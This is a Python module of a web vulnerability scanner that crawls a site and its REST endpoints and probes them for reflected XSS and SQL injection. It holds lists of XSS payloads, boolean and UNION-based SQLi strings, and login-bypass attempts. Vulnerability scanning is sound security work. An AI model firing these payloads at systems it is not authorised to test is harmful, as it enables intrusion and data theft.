import os
import re
import time
import uuid
from difflib import SequenceMatcher
from html import unescape as html_unescape
from html.parser import HTMLParser
from urllib.parse import (
    parse_qsl,
    urldefrag,
    urlencode,
    urljoin,
    urlparse,
    urlsplit,
    urlunparse,
    urlunsplit,
)

import requests

try:
    from .common import (
        add_vulnerability,
        build_session,
        connect_db,
        finish_scan,
        get_scope_root,
        normalize_target_url,
        same_origin,
        start_scan,
    )
except ImportError:
    from common import (
        add_vulnerability,
        build_session,
        connect_db,
        finish_scan,
        get_scope_root,
        normalize_target_url,
        same_origin,
        start_scan,
    )

DEFAULT_TIMEOUT = 8
DEFAULT_MAX_PAGES = 15
DEFAULT_MAX_CANDIDATES = 80
# Maximum number of time-based probes per scan to keep total time reasonable
DEFAULT_MAX_TIME_PROBES = 5
# Seconds to sleep in time-based SQLi payloads
TIME_SLEEP_SECONDS = 5
# Minimum extra delay (seconds) over baseline to consider time-based SQLi confirmed
TIME_THRESHOLD = 4.0
# Max pages to use for guess-based candidate generation (to avoid explosion)
MAX_GUESS_PAGES = 5
# Most common params to try when guessing (subset of XSS/SQLI_PARAM_NAMES)
TOP_GUESS_PARAMS_XSS = {"q", "query", "search", "s", "name", "message", "email", "input"}
TOP_GUESS_PARAMS_SQLI = {"id", "q", "query", "search", "user", "product", "category", "page"}

COMMON_CRAWL_PATHS = [
    "",
    "index.php",
    "index.html",
    "search",
    "search.php",
    "login",
    "login.php",
    "contact",
    "contact.php",
    "comment",
    "comments",
    "guestbook",
    "guestbook.php",
    "product",
    "products",
    "item",
    "items",
    "user",
    "users",
    "vulnerable.php",
    "vuln.php",
    "sqli.php",
    "xss.php",
    "test.php",
    # Common vulnerable-app paths (DVWA, WebGoat, bWAPP, etc.)
    "vulnerabilities",
    "vulnerabilities/sqli",
    "vulnerabilities/xss_r",
    "vulnerabilities/xss_s",
    "vulnerabilities/exec",
    "vulnerabilities/fi",
    "vulnerabilities/csrf",
    "vulnerabilities/upload",
    "vulnerabilities/brute",
    # Juice Shop specific paths
    "rest/products/search",
    "#/search",
    # bWAPP
    "sqli_1.php",
    "sqli_2.php",
    "xss_get.php",
    "xss_post.php",
    "htmli_get.php",
    # Common web app sections
    "admin",
    "dashboard",
    "profile",
    "account",
    "api",
    "register",
    "signup",
    "feedback",
    "forum",
    "blog",
    "page",
    "view",
    "show",
    "detail",
    "details",
]

# ─── REST API Endpoints for SPA Testing ──────────────────────────────────────
# When HTML crawling finds no forms (SPA indicator), these endpoints are probed
# directly. Each entry is (method, path, param, default_value, purpose).

COMMON_API_ENDPOINTS = [
    # --- Search endpoints (XSS + SQLi) ---
    ("get", "rest/products/search", "q", "test", "both"),
    ("get", "api/Products", "q", "test", "both"),
    ("get", "api/search", "q", "test", "both"),
    ("get", "search", "q", "test", "both"),
    ("get", "search", "query", "test", "both"),
    ("get", "search", "term", "test", "both"),
    ("get", "search", "s", "test", "both"),
    ("get", "search", "keyword", "test", "both"),
    # --- User/Auth endpoints (SQLi) ---
    ("get", "api/Users", "id", "1", "sqli"),
    ("get", "api/Users", "q", "admin", "sqli"),
    ("get", "rest/user/whoami", "id", "1", "sqli"),
    ("get", "api/Products", "id", "1", "sqli"),
    ("get", "api/Feedbacks", "id", "1", "sqli"),
    ("get", "api/Challenges", "id", "1", "sqli"),
    # --- Feedback/Comment endpoints (XSS) ---
    ("get", "api/Feedbacks", "q", "test", "xss"),
    ("get", "rest/chatbot/respond", "q", "test", "xss"),
    # --- Generic REST patterns ---
    ("get", "api/v1/search", "q", "test", "both"),
    ("get", "api/v2/search", "q", "test", "both"),
    ("get", "api/v1/users", "id", "1", "sqli"),
    ("get", "api/v1/products", "id", "1", "sqli"),
    ("get", "api/items", "id", "1", "sqli"),
    ("get", "api/posts", "id", "1", "sqli"),
    ("get", "api/articles", "id", "1", "sqli"),
]

# REST API login endpoints to test for SQLi auth bypass
REST_LOGIN_ENDPOINTS = [
    # (path, email_field, password_field)
    ("rest/user/login", "email", "password"),
    ("api/login", "email", "password"),
    ("api/login", "username", "password"),
    ("api/auth/login", "email", "password"),
    ("api/auth/login", "username", "password"),
    ("api/v1/login", "email", "password"),
    ("api/v1/auth", "email", "password"),
    ("login", "email", "password"),
    ("login", "username", "password"),
    ("auth/login", "email", "password"),
]

XSS_PARAM_NAMES = {
    "q",
    "query",
    "search",
    "s",
    "name",
    "message",
    "comment",
    "text",
    "input",
    "keyword",
    "title",
    "description",
    "content",
    "term",
    "email",
    "username",
    "value",
    "data",
    "body",
    "url",
    "redirect",
    "page",
    "lang",
    "ref",
    "callback",
}

SQLI_PARAM_NAMES = {
    "id",
    "uid",
    "user",
    "userid",
    "user_id",
    "product",
    "product_id",
    "item",
    "item_id",
    "cat",
    "category",
    "category_id",
    "page",
    "post",
    "post_id",
    "article",
    "article_id",
    "q",
    "query",
    "search",
    "username",
    "email",
    "name",
    "order",
    "sort",
    "column",
    "table",
    "dir",
    "type",
    "filter",
    "view",
    "report",
    "no",
    "num",
    "number",
}

INJECTABLE_INPUT_TYPES = {
    "",
    "text",
    "search",
    "email",
    "url",
    "tel",
    "number",
    "password",
    "textarea",
    "select",
    "hidden",
}

SKIP_INPUT_TYPES = {"submit", "button", "reset", "file", "image"}

# ─── XSS Payloads ────────────────────────────────────────────────────────────
# Unique marker so we can distinguish scanner-injected content from page content
_XSS_MARKER = "XSS_SCAN"

XSS_PAYLOADS = [
    # Basic script injection
    f'<script>alert("{_XSS_MARKER}")</script>',
    # Break out of attribute context (double quote)
    f'"><script>alert("{_XSS_MARKER}")</script>',
    f'"><img src=x onerror=alert("{_XSS_MARKER}")>',
    f'"><svg/onload=alert("{_XSS_MARKER}")>',
    # Break out of attribute context (single quote)
    f"'><script>alert('{_XSS_MARKER}')</script>",
    f"'><img src=x onerror=alert('{_XSS_MARKER}')>",
    # Event handler injection without new tags (attribute context bypass)
    f'" onfocus="alert(\'{_XSS_MARKER}\')" autofocus="',
    f"' onfocus='alert(\"{_XSS_MARKER}\")' autofocus='",
    f'" onmouseover="alert(\'{_XSS_MARKER}\')" style="position:fixed;top:0;left:0;width:100%;height:100%" "',
    # SVG injection
    f'<svg onload=alert("{_XSS_MARKER}")>',
    # Body/details/marquee event handlers
    f'<body onload=alert("{_XSS_MARKER}")>',
    f'<details open ontoggle=alert("{_XSS_MARKER}")>',
    f'<marquee onstart=alert("{_XSS_MARKER}")>',
    # IMG with various event handlers
    f'<img src=x onerror=alert("{_XSS_MARKER}")>',
    f'<img/src=x onerror=alert("{_XSS_MARKER}")>',
    # Case variation bypass
    f'<ScRiPt>alert("{_XSS_MARKER}")</ScRiPt>',
    f'<IMG SRC=x ONERROR=alert("{_XSS_MARKER}")>',
    # JavaScript URI (for href/src attributes)
    f'javascript:alert("{_XSS_MARKER}")',
    # Polyglot payload — works in multiple contexts
    f"'-alert(\"{_XSS_MARKER}\")-'",
    f"\"-alert(\"{_XSS_MARKER}\")-\"",
    # Template literal injection
    f'${{alert("{_XSS_MARKER}")}}',
    # Encoded angle brackets (some apps decode server-side)
    f'%3Cscript%3Ealert("{_XSS_MARKER}")%3C/script%3E',
]

# ─── SQL Error Patterns ──────────────────────────────────────────────────────
SQL_ERRORS = [
    # MySQL / MariaDB
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysqli_",
    "sql syntax",
    "mysql error",
    "mariadb",
    "check the manual that corresponds to your mysql server version",
    "check the manual that corresponds to your mariadb server version",
    # Generic SQL
    "sqlstate",
    "pdoexception",
    "invalid query",
    "database error",
    "sql error",
    'near "',
    "unclosed quotation",
    "syntax error",
    "unterminated string",
    "unterminated quoted string",
    "quoted string not properly terminated",
    # PostgreSQL
    "postgresql",
    "pg_query",
    "pg_exec",
    "pg_prepare",
    "error: syntax error at or near",
    "valid_schema_name",
    # Oracle
    "oracle error",
    "ora-",
    "ora-01756",
    "ora-00933",
    # SQLite
    "sqlite",
    "sqlite3",
    "sqlite_error",
    "sqlite3::query",
    # SQL Server (MSSQL)
    "microsoft sql",
    "mssql",
    "sql server",
    "unclosed quotation mark after the character string",
    "conversion failed when converting",
    "incorrect syntax near",
    "the multi-part identifier",
    # ODBC / JDBC
    "odbc",
    "jdbc",
    "driver[",
    "[microsoft][odbc",
    # Framework-specific error pages
    "sqlexception",
    "wpdb::prepare",
    "pdo::query",
    "doctrine\\dbal",
    "hibernate",
    "sequelize",
    "knex:",
    "prisma",
    "active record",
    "activerecord::statementerror",
    # Python frameworks
    "operationalerror",
    "programmingError",
    "django.db.utils",
    "sqlalchemy.exc",
    # PHP frameworks
    "laravel",
    "illuminate\\database",
    "wp_error",
    # General patterns
    "unexpected end of sql",
    "warning: pg_",
    "warning: sqlite",
    "dynamic sql error",
    "unrecognized token",
]

NO_RESULT_TOKENS = [
    "no result",
    "no results",
    "not found",
    "aucun résultat",
    "aucun resultat",
    "0 rows",
    "0 results",
    "empty set",
    "no records",
    "no data",
    "no match",
    "no matches",
    "nothing found",
    "zero results",
    "were not found",
    "was not found",
    "doesn't exist",
    "does not exist",
    "no entries",
]

RESULT_TOKENS = [
    "result",
    "results",
    "record",
    "records",
    "row",
    "rows",
    "username",
    "email",
    "first name",
    "first_name",
    "surname",
    "last name",
    "last_name",
    "password",
    "admin",
    "user id",
    "user_id",
    "id:",
    "name:",
    # Extra patterns common in data dumps
    "<td>",
    "<tr>",
    "table",
]


# ─── HTML Parsing ─────────────────────────────────────────────────────────────

class FormAndLinkParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links = []
        self.forms = []
        self._form = None
        self._textarea = None
        self._select = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        tag = tag.lower()

        if tag == "a" and attrs.get("href"):
            self.links.append(attrs["href"])
            return

        if tag == "form":
            self._form = {
                "method": attrs.get("method", "get").lower(),
                "action": attrs.get("action", ""),
                "fields": [],
            }
            return

        if not self._form:
            return

        if tag == "input":
            name = attrs.get("name")
            if not name:
                return
            input_type = attrs.get("type", "text").lower()
            self._form["fields"].append(
                {"name": name, "type": input_type, "value": attrs.get("value", "")}
            )
        elif tag == "textarea":
            name = attrs.get("name")
            if name:
                self._textarea = {"name": name, "type": "textarea", "value": ""}
        elif tag == "select":
            name = attrs.get("name")
            if name:
                self._select = {"name": name, "type": "select", "value": ""}
        elif tag == "option" and self._select and not self._select["value"]:
            self._select["value"] = attrs.get("value", "")

    def handle_data(self, data):
        if self._textarea is not None:
            self._textarea["value"] += data

    def handle_endtag(self, tag):
        tag = tag.lower()
        if tag == "textarea" and self._form and self._textarea:
            self._form["fields"].append(self._textarea)
            self._textarea = None
        elif tag == "select" and self._form and self._select:
            self._form["fields"].append(self._select)
            self._select = None
        elif tag == "form" and self._form:
            if self._form["method"] not in ("get", "post"):
                self._form["method"] = "get"
            self.forms.append(self._form)
            self._form = None


# ─── Utility Functions ────────────────────────────────────────────────────────

def _compact(text):
    return " ".join(text.lower().split())[:12000]


def _similar(a, b):
    return SequenceMatcher(None, _compact(a), _compact(b)).ratio()


def _join_url(root, path):
    if not path:
        return root
    return f"{root.rstrip('/')}/{path.strip('/')}"


def _absolute_url(base, href):
    if not href:
        return base
    absolute = urljoin(base if base.endswith("/") else f"{base}/", href)
    absolute, _ = urldefrag(absolute)
    return absolute


def _with_params(url, params):
    parsed = urlsplit(url)
    existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
    existing.update({k: v for k, v in params.items() if k})
    return urlunsplit(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            urlencode(existing),
            parsed.fragment,
        )
    )


def _parse_page(response):
    parser = FormAndLinkParser()
    content_type = response.headers.get("Content-Type", "")
    if (
        "html" not in content_type.lower()
        and "<html" not in response.text[:500].lower()
    ):
        return parser
    parser.feed(response.text)
    return parser


def _is_auth_redirect(response, requested_url):
    """Check if the response was redirected to a login page."""
    requested_path = urlparse(requested_url).path.lower()
    final_path = urlparse(response.url).path.lower()
    if not response.history:
        return False
    login_indicators = ("login", "signin", "sign-in", "auth", "sso", "cas/login")
    return (
        any(ind in final_path for ind in login_indicators)
        and not any(ind in requested_path for ind in login_indicators)
    )


def _count_table_rows(html_text):
    """Count <tr> tags in HTML — useful for detecting data differences."""
    return html_text.lower().count("<tr")


# ─── Page & Form Discovery ───────────────────────────────────────────────────

def _discover_pages_and_forms(session, root, timeout, max_pages):
    """Crawl the target to discover pages and forms.

    Unlike the previous version, auth-redirected pages are logged as warnings
    but the crawl continues (the session may have valid cookies for other paths).
    """
    seen_pages = set()
    queue = []
    auth_warnings = []

    for path in COMMON_CRAWL_PATHS:
        queue.append(_join_url(root, path))

    pages = []
    forms = []

    while queue and len(pages) < max_pages:
        page_url = queue.pop(0)
        if page_url in seen_pages or not same_origin(page_url, root):
            continue
        seen_pages.add(page_url)

        try:
            response = session.get(page_url, timeout=timeout, allow_redirects=True)
        except requests.exceptions.RequestException:
            continue

        if response.status_code >= 400:
            continue

        # Log auth redirect as warning but still try to parse the landing page
        # (the login page itself may have forms we can discover).
        if _is_auth_redirect(response, page_url):
            auth_warnings.append(page_url)
            print(
                f"  [!] Auth redirect: {page_url} -> {response.url} "
                f"(page is behind authentication — provide a session cookie)"
            )
            # Still parse the login page for forms (but don't add to injectable pages)
            parser = _parse_page(response)
            for href in parser.links:
                absolute = _absolute_url(response.url, href)
                if (
                    same_origin(absolute, root)
                    and absolute not in seen_pages
                    and len(queue) < max_pages * 3
                ):
                    queue.append(absolute)
            continue

        pages.append(response.url)
        parser = _parse_page(response)

        for form in parser.forms:
            action_url = _absolute_url(response.url, form.get("action", ""))
            if same_origin(action_url, root):
                forms.append(
                    {**form, "page_url": response.url, "action_url": action_url}
                )

        for href in parser.links:
            absolute = _absolute_url(response.url, href)
            if (
                same_origin(absolute, root)
                and absolute not in seen_pages
                and len(queue) < max_pages * 3
            ):
                queue.append(absolute)

    if auth_warnings:
        print(
            f"  [!] {len(auth_warnings)} page(s) skipped due to auth redirect. "
            f"Provide a valid session cookie for better coverage."
        )

    return pages, forms


def _field_default(field, purpose):
    value = field.get("value") or ""
    if value:
        return value
    name = field.get("name", "").lower()
    if purpose == "sqli" or "id" in name or field.get("type") == "number":
        return "1"
    if field.get("type") == "email" or "email" in name:
        return "scanner@example.local"
    return "test"


def _candidate_key(candidate):
    data_keys = tuple(sorted(candidate.get("base_data", {}).keys()))
    return (candidate["method"], candidate["url"], candidate["param"], data_keys)


def _dedupe(candidates):
    seen = set()
    unique = []
    for candidate in candidates:
        key = _candidate_key(candidate)
        if key in seen:
            continue
        seen.add(key)
        unique.append(candidate)
    return unique


def _direct_query_candidates(url):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    if not params:
        return []
    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
    return [
        {
            "method": "get",
            "url": base_url,
            "param": key,
            "base_data": {**params, key: value or "test"},
            "source": "url",
        }
        for key, value in params.items()
    ]


def _page_guess_candidates(pages, purpose):
    # Use a REDUCED set of param names and pages to avoid candidate explosion.
    # API-probed candidates (added elsewhere) are much higher value.
    names = TOP_GUESS_PARAMS_XSS if purpose == "xss" else TOP_GUESS_PARAMS_SQLI
    value = "test" if purpose == "xss" else "1"
    candidates = []
    limited_pages = pages[:MAX_GUESS_PAGES]
    for page in limited_pages:
        for name in names:
            candidates.append(
                {
                    "method": "get",
                    "url": page,
                    "param": name,
                    "base_data": {name: value},
                    "source": "guess",
                }
            )
    return candidates


def _form_candidates(forms, purpose):
    candidates = []
    for form in forms:
        fields = form.get("fields", [])
        if not fields:
            continue

        base_data = {}
        injectable = []
        for field in fields:
            name = field.get("name")
            input_type = field.get("type", "text").lower()
            if not name or input_type in SKIP_INPUT_TYPES:
                continue
            base_data[name] = _field_default(field, purpose)
            if input_type in INJECTABLE_INPUT_TYPES:
                injectable.append(name)

        for name in injectable:
            candidates.append(
                {
                    "method": form.get("method", "get"),
                    "url": form.get("action_url"),
                    "param": name,
                    "base_data": dict(base_data),
                    "source": f"form:{form.get('page_url')}",
                }
            )
    return candidates


def _api_candidates(root, session, timeout, purpose="both"):
    """Generate injection candidates from known REST API endpoint patterns.

    This is critical for SPAs (Juice Shop, React/Angular apps) where HTML
    crawling finds zero forms because everything is loaded via JavaScript.
    """
    candidates = []
    for method, path, param, default_value, ep_purpose in COMMON_API_ENDPOINTS:
        if purpose != "both" and ep_purpose != "both" and ep_purpose != purpose:
            continue

        url = f"{root.rstrip('/')}/{path.strip('/')}"
        # Quick probe to see if the endpoint exists
        try:
            test_data = {param: default_value}
            if method == "get":
                resp = session.get(
                    _with_params(url, test_data), timeout=timeout, allow_redirects=True
                )
            else:
                resp = session.post(
                    url, json=test_data, timeout=timeout, allow_redirects=True
                )
            # Skip endpoints that return 404 or similar
            if resp.status_code >= 404:
                continue
        except requests.exceptions.RequestException:
            continue

        candidates.append({
            "method": method,
            "url": url,
            "param": param,
            "base_data": {param: default_value},
            "source": "api_probe",
        })

    return candidates


def _rest_login_sqli_candidates(root, session, timeout):
    """Generate SQLi candidates specifically for REST API login endpoints.

    Tests POST JSON login endpoints for SQL injection auth bypass.
    These are separate because they use JSON body, not URL params.
    """
    candidates = []
    for path, email_field, password_field in REST_LOGIN_ENDPOINTS:
        url = f"{root.rstrip('/')}/{path.strip('/')}"
        # Quick probe to see if the endpoint exists
        try:
            test_data = {email_field: "test@test.com", password_field: "test"}
            resp = session.post(
                url, json=test_data, timeout=timeout, allow_redirects=True
            )
            # Skip endpoints that return 404
            if resp.status_code == 404:
                continue
            # 401/200/500 all indicate the endpoint exists
        except requests.exceptions.RequestException:
            continue

        # Add the email field as injectable (classic SQLi auth bypass)
        candidates.append({
            "method": "post",
            "url": url,
            "param": email_field,
            "base_data": {email_field: "test@test.com", password_field: "test"},
            "source": f"rest_login:{path}",
            "json_mode": True,  # Flag for JSON body instead of form data
        })

    return candidates


def _build_candidates(
    url_cible, session, scan_target, crawl_root, timeout, max_pages, max_candidates
):
    pages, forms = _discover_pages_and_forms(session, crawl_root, timeout, max_pages)
    for page in (scan_target, crawl_root):
        if page not in pages:
            pages.insert(0, page)

    direct = _direct_query_candidates(url_cible)

    # Detect if this is a SPA (no forms found from crawling)
    is_spa = len(forms) == 0
    if is_spa:
        print("  [i] Aucun formulaire HTML détecté — probable SPA. Activation du probing REST API...")

    # Always try API probing (works on both SPAs and traditional apps)
    api_xss = _api_candidates(crawl_root, session, timeout, "xss")
    api_sqli = _api_candidates(crawl_root, session, timeout, "sqli")
    login_sqli = _rest_login_sqli_candidates(crawl_root, session, timeout)

    if api_xss or api_sqli:
        print(f"  [i] Endpoints API découverts: {len(api_xss)} XSS, {len(api_sqli)} SQLi")
    if login_sqli:
        print(f"  [i] Endpoints login REST découverts: {len(login_sqli)}")

    xss_candidates = (
        direct + _form_candidates(forms, "xss") + api_xss + _page_guess_candidates(pages, "xss")
    )
    sqli_candidates = (
        direct + _form_candidates(forms, "sqli") + api_sqli + login_sqli + _page_guess_candidates(pages, "sqli")
    )

    return _dedupe(xss_candidates)[:max_candidates], _dedupe(sqli_candidates)[
        :max_candidates
    ]


# ─── Request Sending ─────────────────────────────────────────────────────────

def _send_candidate(session, candidate, value, timeout):
    data = dict(candidate.get("base_data", {}))
    data[candidate["param"]] = value
    method = candidate.get("method", "get").lower()
    json_mode = candidate.get("json_mode", False)

    if method == "post":
        if json_mode:
            return session.post(
                candidate["url"], json=data, timeout=timeout, allow_redirects=True
            )
        return session.post(
            candidate["url"], data=data, timeout=timeout, allow_redirects=True
        )
    return session.get(
        _with_params(candidate["url"], data), timeout=timeout, allow_redirects=True
    )


def _timed_send(session, candidate, value, timeout):
    """Send a candidate and return (response, elapsed_seconds)."""
    data = dict(candidate.get("base_data", {}))
    data[candidate["param"]] = value
    method = candidate.get("method", "get").lower()
    json_mode = candidate.get("json_mode", False)

    start = time.monotonic()
    if method == "post":
        if json_mode:
            resp = session.post(
                candidate["url"], json=data, timeout=max(timeout, TIME_SLEEP_SECONDS + 5),
                allow_redirects=True,
            )
        else:
            resp = session.post(
                candidate["url"], data=data, timeout=max(timeout, TIME_SLEEP_SECONDS + 5),
                allow_redirects=True,
            )
    else:
        resp = session.get(
            _with_params(candidate["url"], data),
            timeout=max(timeout, TIME_SLEEP_SECONDS + 5),
            allow_redirects=True,
        )
    elapsed = time.monotonic() - start
    return resp, elapsed


# ─── XSS Detection ───────────────────────────────────────────────────────────

def _contains_raw_xss(response_text, payload):
    """Check if a XSS payload is reflected without proper encoding.

    Detection strategy:
    1. Exact payload match in response → confirmed.
    2. Check for key dangerous tokens (script tags, event handlers) that
       indicate the payload was reflected without HTML-entity encoding.
       Tokens must appear NEAR the marker (within ~500 chars) to avoid
       false positives from the page's own scripts.
    3. HTML-decode the response and re-check — catches cases where the
       app double-encodes or the browser would decode entities.
    4. Check JSON responses — APIs may reflect payloads inside JSON strings,
       but only flag if dangerous HTML tokens are also present.
    """
    # 1. Exact match
    if payload in response_text:
        return True

    # 2. Proximity-based check: marker + dangerous tokens must appear near each other
    lowered = response_text.lower()
    marker_lower = _XSS_MARKER.lower()

    # Our marker must appear somewhere for this to be a reflection
    if marker_lower not in lowered:
        return False

    dangerous_tokens = (
        "<script", "</script>", "<svg", "<img", "<body", "<details", "<marquee",
        "onerror=", "onload=", "onfocus=", "onmouseover=", "ontoggle=", "onstart=",
        "javascript:", "alert(",
    )

    # Find all positions where the marker appears and check if any dangerous
    # token is within a ~500 char window around it
    marker_pos = 0
    while True:
        idx = lowered.find(marker_lower, marker_pos)
        if idx == -1:
            break
        window_start = max(0, idx - 500)
        window_end = min(len(lowered), idx + len(marker_lower) + 500)
        window = lowered[window_start:window_end]
        if any(token in window for token in dangerous_tokens):
            return True
        marker_pos = idx + 1

    # 3. HTML-decode the response and re-check with proximity
    decoded = html_unescape(response_text)
    decoded_lower = decoded.lower()
    if marker_lower in decoded_lower:
        # Check exact decoded match first
        if payload in decoded:
            return True
        # Proximity check on decoded content
        marker_pos = 0
        while True:
            idx = decoded_lower.find(marker_lower, marker_pos)
            if idx == -1:
                break
            window_start = max(0, idx - 500)
            window_end = min(len(decoded_lower), idx + len(marker_lower) + 500)
            window = decoded_lower[window_start:window_end]
            if any(token in window for token in dangerous_tokens):
                return True
            marker_pos = idx + 1

    # 4. JSON response handling — check if payload is reflected inside JSON strings
    # Only flag if dangerous HTML tokens are also present (not just the marker,
    # since APIs legitimately echo search terms like {"query": "XSS_SCAN"}).
    try:
        import json
        if response_text.strip().startswith('{') or response_text.strip().startswith('['):
            json_str = json.dumps(json.loads(response_text))
            if _XSS_MARKER in json_str:
                json_lower = json_str.lower()
                if any(token in json_lower for token in dangerous_tokens):
                    return True
    except (json.JSONDecodeError, ValueError):
        pass

    return False


def _canary_reflects(session, candidate, timeout):
    """Inject a unique canary string and check if it's reflected in the response.

    Returns (reflects, response_text) — if the canary reflects, there's a high
    chance that XSS payloads will also reflect if the app doesn't encode output.
    """
    canary = f"SCANCANARY{uuid.uuid4().hex[:8]}"
    try:
        response = _send_candidate(session, candidate, canary, timeout)
        return canary in response.text, response.text
    except requests.exceptions.RequestException:
        return False, ""


# ─── SQLi Detection ──────────────────────────────────────────────────────────

def _contains_sql_error(text):
    lowered = text.lower()
    found = any(error in lowered for error in SQL_ERRORS)
    if not found:
        # Also check JSON error responses (common in REST APIs)
        # e.g., {"error": {"message": "SQLITE_ERROR: ..."}}
        try:
            import json
            if text.strip().startswith('{'):
                data = json.loads(text)
                # Recursively check all string values in the JSON for SQL errors
                json_text = json.dumps(data).lower()
                found = any(error in json_text for error in SQL_ERRORS)
        except (json.JSONDecodeError, ValueError):
            pass
    return found


def _token_count(text, tokens):
    lowered = text.lower()
    return sum(lowered.count(token) for token in tokens)


def _is_boolean_sqli(baseline, true_response, false_response):
    """Detect boolean-based blind SQLi by comparing true/false responses.

    Relaxed thresholds compared to original to catch more real-world cases
    like DVWA where the page template is identical but data rows differ.
    """
    true_text = true_response.text
    false_text = false_response.text

    # 1. SQL error in either response → immediate detection
    if _contains_sql_error(true_text) or _contains_sql_error(false_text):
        return True, "Une réponse contient une erreur SQL."

    # 2. Status code divergence
    if true_response.status_code != false_response.status_code:
        if true_response.status_code < 500 and false_response.status_code >= 400:
            return (
                True,
                "Le payload vrai est accepté alors que le payload faux est rejeté.",
            )
        if true_response.status_code < 500 and false_response.status_code >= 500:
            return (
                True,
                "Le payload faux provoque une erreur serveur alors que le payload vrai est accepté.",
            )

    true_len = len(true_text)
    false_len = len(false_text)
    length_gap = abs(true_len - false_len)
    similarity = _similar(true_text, false_text)

    # 3. Result token analysis
    true_results = _token_count(true_text, RESULT_TOKENS)
    false_results = _token_count(false_text, RESULT_TOKENS)
    true_no_results = _token_count(true_text, NO_RESULT_TOKENS)
    false_no_results = _token_count(false_text, NO_RESULT_TOKENS)

    # Relaxed: true has more results OR false has more "no result" markers
    if true_results >= false_results + 2 and false_no_results > true_no_results:
        return (
            True,
            "Le payload vrai retourne des résultats alors que le payload faux retourne une page vide/non trouvée.",
        )

    if true_results > false_results and false_no_results >= true_no_results + 1:
        return (
            True,
            "Le payload vrai montre plus de données que le payload faux qui affiche un message d'absence.",
        )

    # 4. HTML table row difference (key for DVWA-style apps)
    true_rows = _count_table_rows(true_text)
    false_rows = _count_table_rows(false_text)
    if true_rows >= false_rows + 2:
        return (
            True,
            f"Le payload vrai retourne {true_rows} lignes de tableau contre {false_rows} pour le faux.",
        )

    # 5. Length/similarity divergence
    min_len = min(true_len, false_len) if min(true_len, false_len) > 0 else 1
    if length_gap > max(120, min_len * 0.15) and similarity < 0.88:
        return True, "Les réponses vrai/faux sont significativement différentes."

    # 6. Pure length difference as standalone heuristic (for very short pages)
    if min_len < 300 and length_gap > 50 and similarity < 0.90:
        return True, "Les réponses sont de longueurs significativement différentes pour des pages courtes."

    # 7. Baseline comparison (if available)
    if baseline is not None:
        base_text = baseline.text
        true_vs_base = _similar(true_text, base_text)
        false_vs_base = _similar(false_text, base_text)
        if true_vs_base > 0.70 and false_vs_base < 0.55:
            return (
                True,
                "La réponse vraie ressemble à la page normale alors que la réponse fausse diffère fortement.",
            )
        # Also check: false looks like baseline but true is very different (data dump)
        if false_vs_base > 0.70 and true_vs_base < 0.55:
            return (
                True,
                "Le payload vrai provoque un changement majeur de la page (possible extraction de données).",
            )

    return False, ""


def _sqli_payload_pairs(original):
    original = str(original or "1")
    return [
        # Numeric context
        (f"{original} OR 1=1", f"{original} AND 1=2"),
        (f"{original} OR 1=1-- -", f"{original} AND 1=2-- -"),
        (f"{original} OR 1=1#", f"{original} AND 1=2#"),
        (f"{original} OR 1=1/*", f"{original} AND 1=2/*"),
        # Single quoted context
        (f"{original}' OR '1'='1", f"{original}' AND '1'='2"),
        (f"{original}' OR '1'='1'-- -", f"{original}' AND '1'='2'-- -"),
        (f"{original}' OR '1'='1'#", f"{original}' AND '1'='2'#"),
        ("' OR '1'='1", "' AND '1'='2"),
        ("' OR '1'='1'-- -", "' AND '1'='2'-- -"),
        ("' OR 1=1-- -", "' AND 1=2-- -"),
        ("' OR 1=1#", "' AND 1=2#"),
        # Double quoted context
        (f'{original}" OR "1"="1', f'{original}" AND "1"="2'),
        (f'{original}" OR "1"="1"-- -', f'{original}" AND "1"="2"-- -'),
        ('" OR "1"="1"-- -', '" AND "1"="2"-- -'),
        # Parenthesized context
        (f"{original}') OR ('1'='1", f"{original}') AND ('1'='2"),
        ("') OR ('1'='1'-- -", "') AND ('1'='2'-- -"),
        (f"{original}') OR 1=1-- -", f"{original}') AND 1=2-- -"),
        # LIKE-based (for search forms)
        (f"{original}%' OR '1'='1'-- -", f"{original}%' AND '1'='2'-- -"),
        (f"{original}%' OR 1=1-- -", f"{original}%' AND 1=2-- -"),
    ]


def _sqli_error_payloads(original):
    original = str(original or "1")
    return [
        f"{original}'",
        f'{original}"',
        f"{original}')",
        f'{original}")',
        "'",
        '"',
        "')",
        '")',
        "\\",
        f"{original}' AND '",
        f"{original}'; --",
        "1' OR '1'='1' /*",
        "' UNION SELECT NULL-- -",
    ]


# ─── UNION-based SQLi ────────────────────────────────────────────────────────

def _test_union_sqli(session, candidate, original, timeout):
    """Test for UNION-based SQL injection.

    Strategy:
    1. Use ORDER BY to probe column count (incrementing until error).
    2. Attempt UNION SELECT with the discovered column count.
    3. Use a unique marker to confirm data extraction.
    """
    original = str(original or "1")
    marker = f"SQLI_{uuid.uuid4().hex[:6]}"

    # Phase 1: Determine column count via ORDER BY
    # Reduced max columns and permutations for speed
    col_count = 0
    for n in range(1, 8):
        for prefix in (
            f"{original}' ORDER BY {n}-- -",
            f"{original} ORDER BY {n}-- -",
        ):
            try:
                resp = _send_candidate(session, candidate, prefix, timeout)
            except requests.exceptions.RequestException:
                continue

            if _is_auth_redirect(resp, candidate["url"]):
                continue

            if resp.status_code >= 500 or _contains_sql_error(resp.text):
                if n > 1:
                    col_count = n - 1
                break
        if col_count:
            break

    if col_count == 0:
        col_count_candidates = [1, 2, 3, 4]
    else:
        col_count_candidates = [col_count]

    # Phase 2: UNION SELECT with marker
    for nc in col_count_candidates:
        columns = ",".join(
            [f"'{marker}'" if i == 0 else "NULL" for i in range(nc)]
        )
        for prefix_tpl in (
            f"{original}' UNION SELECT {columns}-- -",
            f"{original} UNION SELECT {columns}-- -",
            f"' UNION SELECT {columns}-- -",
        ):
                try:
                    resp = _send_candidate(session, candidate, prefix_tpl, timeout)
                except requests.exceptions.RequestException:
                    continue

                if _is_auth_redirect(resp, candidate["url"]):
                    continue

                if marker in resp.text:
                    return (
                        True,
                        f"UNION SELECT avec {nc} colonne(s) extrait des données. "
                        f"Le marqueur '{marker}' apparaît dans la réponse.",
                    )

    return False, ""


# ─── Time-based Blind SQLi ───────────────────────────────────────────────────

